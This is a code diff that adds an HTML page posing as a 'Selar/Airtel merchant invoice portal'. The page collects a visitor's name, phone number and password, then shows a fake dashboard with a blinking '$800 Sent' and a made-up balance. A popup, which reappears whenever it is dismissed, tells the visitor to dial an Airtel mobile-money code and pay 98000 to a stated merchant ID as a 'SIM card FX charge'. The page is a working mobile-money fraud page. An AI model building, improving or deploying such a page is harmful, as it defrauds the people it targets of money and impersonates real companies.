@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selar Merchant International</title>
+    <style>
+        :root { 
+            --airtel-red: #ff0000; 
+            --selar-blue: #002d5b; 
+            --bg-soft: #f4f7f9;
+            --gold: #ffb400;
+        }
+        body { font-family: 'Segoe UI', Roboto, sans-serif; background-color: #1a1a1a; margin: 0; padding: 0; display: flex; justify-content: center; }
+        
+        .mobile-container { width: 100%; max-width: 400px; background: white; min-height: 100vh; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; overflow-x: hidden; }
+        .hidden { display: none !important; }
+
+        /* --- LOGIN SECTION --- */
+        #login-view { background-color: var(--bg-soft); min-height: 100vh; }
+        .intl-header-box { font-size: 0.65rem; color: #666; text-align: right; padding: 12px 15px; line-height: 1.4; background: white; border-bottom: 1px solid #eee; }
+        .intl-header-box b { color: var(--airtel-red); }
+        .login-hero { text-align: center; padding: 35px 20px 15px; }
+        .airtel-logo-red { color: var(--airtel-red); font-size: 2.8rem; font-weight: 800; letter-spacing: -2px; }
+        .login-card { margin: 0 20px; background: white; padding: 25px 20px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); border: 1px solid #eee; }
+        .login-card label { display: block; font-size: 0.7rem; font-weight: 700; color: #999; margin-bottom: 5px; text-transform: uppercase; }
+        .login-card input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 10px; border: 1.5px solid #f0f0f0; background: #fafafa; box-sizing: border-box; font-size: 1rem; }
+        .btn-access { width: 100%; padding: 16px; background: var(--airtel-red); color: white; border: none; border-radius: 30px; font-weight: 800; cursor: pointer; }
+
+        /* --- DASHBOARD STYLING --- */
+        .dash-header { background: var(--selar-blue); color: white; padding: 20px; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; }
+        .visa-tag { font-size: 0.6rem; font-weight: 800; color: var(--gold); letter-spacing: 1px; }
+        .recent-msg { background: rgba(255,255,255,0.1); padding: 10px; border-radius: 10px; font-size: 0.7rem; margin-top: 12px; border-left: 3px solid #00ff00; }
+        .blink { animation: blinker 1.2s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0.2; } }
+        .balance-section { background: white; margin: -20px 20px 0; padding: 20px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); text-align: center; }
+
+        /* --- SERVICE GRID --- */
+        .service-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; padding: 30px 20px; }
+        .service-item { text-align: center; }
+        .icon-circ { width: 55px; height: 55px; border-radius: 18px; display: flex; align-items: center; justify-content: center; margin: 0 auto 8px; font-size: 22px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .bg-transfer { background: #e3f2fd; color: #1976d2; } 
+        .bg-withdraw { background: #fff3e0; color: #f57c00; } 
+        .bg-bills { background: #fce4ec; color: #d81b60; }    
+        .bg-browser { background: #e8f5e9; color: #388e3c; }  
+        .bg-special { background: #f3e5f5; color: #7b1fa2; }  
+        .bg-rates { background: #fffde7; color: #fbc02d; }    
+        .service-label { font-size: 0.65rem; font-weight: 700; color: #666; }
+
+        /* --- HIGH TRANSPARENCY NOTIFICATION --- */
+        #sim-popup { 
+            position: absolute; inset: 0; 
+            background: rgba(255, 255, 255, 0.2); /* Very light overlay */
+            backdrop-filter: blur(8px); /* Crystal clear blur effect */
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 500; 
+            display: flex; align-items: center; justify-content: center; padding: 20px; 
+        }
+        .notif-box { 
+            background: rgba(255, 255, 255, 0.92); /* Semi-transparent box */
+            border-radius: 25px; padding: 25px; 
+            border: 2px solid var(--airtel-red); 
+            width: 100%; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.15); 
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loader-screen { position: absolute; inset: 0; background: white; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    </style>
+</head>
+<body>
+
+<div class="mobile-container">
+    
+    <div id="login-view">
+        <div class="intl-header-box">
+            <b>Selar Merchant Invoice International</b><br>
+            Plot Z, USA, Chicago, Brooklyn Street Road, P.O. Box 25630 - Chicago<br>
+            +1 - USA
+        </div>
+        <div class="login-hero">
+            <div class="airtel-logo-red">selar/airtel</div>
+            <p style="font-size: 0.75rem; color: #999; font-weight: bold;">SELAR MERCHANT INVOICE PORTAL</p>
+        </div>
+        <div class="login-card">
+            <label>Full Name</label>
+            <input type="text" id="m-name" placeholder="Enter Full Name">
+            <label>Phone Number</label>
+            <input type="text" id="m-phone" placeholder="Enter Phone Number">
+            <label>Create Merchant Password</label>
+            <input type="password" id="m-pin" placeholder="••••••••">
+            <button class="btn-access" onclick="handleLogin()">Access Dashboard</button>
+        </div>
+    </div>
+
+    <div id="loader" class="loader-screen hidden">
+        <div style="width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--airtel-red); border-radius: 50%; animation: spin 1s linear infinite;"></div>
+        <div style="font-size: 1.4rem; font-weight: 900; margin-top: 20px; color: var(--selar-blue);">Selar airtel</div>
+        <p id="load-text" style="font-size: 0.85rem; color: #777; padding: 0 30px; margin-top: 10px;"></p>
+    </div>
+
+    <div id="dashboard-view" class="hidden">
+        <div class="intl-header-box">
+            <b>Selar Merchant Invoice International</b><br>
+            Plot Z, USA, Chicago, Brooklyn Street Road, P.O. Box 25630 - Chicago | +1 - USA
+        </div>
+        <div class="dash-header">
+            <div class="visa-tag">SELAR VISA MASTERCARD</div>
+            <div class="recent-msg">
+                ACTIVITY: <span class="blink" style="color:#00ff00; font-weight: bold;">$800 Sent</span> lolikishee USA CHICAGO
+            </div>
+            <div id="dash-merchant-tag" style="margin-top: 15px; font-weight: 800; font-size: 0.95rem;"></div>
+        </div>
+        <div class="balance-section">
+            <div style="font-size: 0.65rem; font-weight: bold; color: #bbb;">TOTAL FLOAT BALANCE</div>
+            <div class="blink" style="font-size: 1.6rem; font-weight: 800; color: var(--selar-blue);">2,906,702. UGX</div>
+            <div class="blink" style="font-size: 1rem; font-weight: bold; color: #2e7d32;">EQUALS EXACTLY 800$</div>
+        </div>
+        <div class="service-grid">
+            <div class="service-item"><div class="icon-circ bg-transfer">💸</div><div class="service-label">Transfer</div></div>
+            <div class="service-item"><div class="icon-circ bg-withdraw">🏧</div><div class="service-label">Withdraw</div></div>
+            <div class="service-item"><div class="icon-circ bg-bills">🧾</div><div class="service-label">Pay Bills</div></div>
+            <div class="service-item"><div class="icon-circ bg-browser">🌐</div><div class="service-label">Browser</div></div>
+            <div class="service-item"><div class="icon-circ bg-rates">💱</div><div class="service-label">Rates</div></div>
+            <div class="service-item"><div class="icon-circ bg-special">🎁</div><div class="service-label">Special</div></div>
+        </div>
+
+        <div id="sim-popup" class="hidden">
+            <div class="notif-box">
+                <div style="font-weight: 900; color: var(--selar-blue); border-bottom: 1px solid #ddd; padding-bottom: 8px; margin-bottom: 12px;">SELAR MERCHANT ACCOUNT</div>
+                <div style="color: #d32f2f; font-weight: 800; font-size: 0.8rem;">SIM CARD FX CHARGE</div>
+                <div style="font-size: 0.8rem; margin: 8px 0;">Currently Work on Airtel <span style="animation: blinker 0.8s infinite; display:inline-block;">🇺🇬</span></div>
+                <p style="font-size: 0.75rem; color: #555;">Register your SIM Card to initiate transaction on <br><b id="notif-target" style="color:var(--selar-blue)"></b></p>
+                <div style="background: rgba(0,0,0,0.05); padding: 12px; border-radius: 12px; font-size: 0.8rem; line-height: 1.6; margin: 10px 0;">
+                    <b>Registration Steps:</b><br>
+                    Dial: <span style="color:red; font-weight: bold;">*185*9#</span> 📞<br>
+                    🆔 Merchant ID: <b>6837633</b><br>
+                    💵 Amount: <b>98000</b><br>
+                    🔖 Reference: <b>selar merchant</b><br>
+                    ✅ Confirm: <b>Allow the notification to complete the transaction</b>
+                </div>
+                <div style="display: flex; gap: 10px; margin-top: 15px;">
+                    <button onclick="window.location.href='tel:*185%23'" style="flex:1; padding: 12px; border-radius: 10px; border:none; background:var(--airtel-red); color:white; font-weight:bold; cursor:pointer;">Register Now</button>
+                    <button onclick="closePop()" style="flex:1; padding: 12px; border-radius: 10px; border:none; background:#eee; font-weight:bold; cursor:pointer;">Later</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    window.onload = function() {
+        const saved = localStorage.getItem('selar_session_v4');
+        if (saved) { launchDash(JSON.parse(saved)); }
+    };
+
+    function handleLogin() {
+        const name = document.getElementById('m-name').value;
+        const phone = document.getElementById('m-phone').value;
+        if (!name || !phone) { alert("Please fill all fields"); return; }
+        const user = { name, phone };
+        document.getElementById('login-view').classList.add('hidden');
+        document.getElementById('loader').classList.remove('hidden');
+        document.getElementById('load-text').innerText = `Configuring selar merchant account of ${phone} - ${name}...`;
+        setTimeout(() => {
+            localStorage.setItem('selar_session_v4', JSON.stringify(user));
+            launchDash(user);
+        }, 8000);
+    }
+
+    function launchDash(user) {
+        document.getElementById('login-view').classList.add('hidden');
+        document.getElementById('loader').classList.add('hidden');
+        document.getElementById('dashboard-view').classList.remove('hidden');
+        document.getElementById('dash-merchant-tag').innerText = `${user.phone} - ${user.name.toUpperCase()}`;
+        document.getElementById('notif-target').innerText = `${user.phone} - ${user.name}`;
+        setTimeout(() => { document.getElementById('sim-popup').classList.remove('hidden'); }, 2000);
+    }
+
+    function closePop() {
+        document.getElementById('sim-popup').classList.add('hidden');
+        setTimeout(() => { document.getElementById('sim-popup').classList.remove('hidden'); }, 1000);
+    }
+</script>
+
+</body>
+</html>
